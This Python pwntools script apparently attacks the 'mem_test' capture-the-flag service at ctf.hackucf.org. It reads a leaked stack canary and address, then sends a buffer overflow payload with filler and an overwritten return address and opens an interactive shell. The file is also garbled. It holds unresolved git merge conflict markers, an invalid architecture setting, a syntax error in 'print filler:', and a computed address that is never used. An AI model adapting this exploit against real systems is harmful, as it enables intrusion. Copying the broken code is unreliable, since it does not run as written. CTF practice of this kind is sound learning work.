from pwn import *

<<<<<<< Updated upstream
context(arch='amd32', os='linux')
#context.log_level =False
local = True
binary      = ELF('mem_test')
lib        = ELF('libpwnableharness32.so')
=======
conn = remote("ctf.hackucf.org", 9004)


def connectToSocket():
    print (conn.recvuntil("------Test Your Memory!-------" ) )
    print conn.recvline()
    conn.close()
>>>>>>> Stashed changes

if remote:
    conn = remote('localhost', 1234)
else:
    conn = remote('ctf.hackucf.org', 9004)

def getCanary():
    print conn.recvuntil("------Test Your Memory!-------" )
    print conn.recvline() + conn.recvline()
    canary = conn.recvline()
    canary = canary.strip()
    canary = canary.strip('\n')

    return str(canary)


def getMemAddress():
    #The output is
    #I know that mine is fine...see? : 0x8048980
    line = conn.recvline()
    print line
    memAddress = line.split(": ")[1]


    #get ready for the input
    print conn.recvuntil("> ")

    #print "MemAddress: " + memAddress

    memAddress = int(memAddress.strip(), 16)
    return memAddress

def makePayload(canary, memAddress):
    #To find the offset of hint and memory I subtracted the two addresses
    offsetToWin_Func = 0x11a
    offsetToReturn = 19
    offsetToReturn -= 7 # the size of the addresss

    returnAddress = p32(0x8048866)
    print returnAddress


    memAddress = memAddress - offsetToWin_Func

    print hex(memAddress)
    memAddress = p64(memAddress)
    print memAddress
    filler = 'a' * offsetToReturn

    payload = canary
    payload += filler
    payload += returnAddress
    print payload
    return payload

def sendPayload(payload):

    conn.sendline(payload)

    conn.interactive()
if __name__ == "__main__":
<<<<<<< Updated upstream
    canary = getCanary()
    memAddress= getMemAddress()
    payload = makePayload(canary, memAddress)

    sendPayload(payload)
=======
    connectToSocket()
    filler = 'a' * 14
    print filler:
>>>>>>> Stashed changes
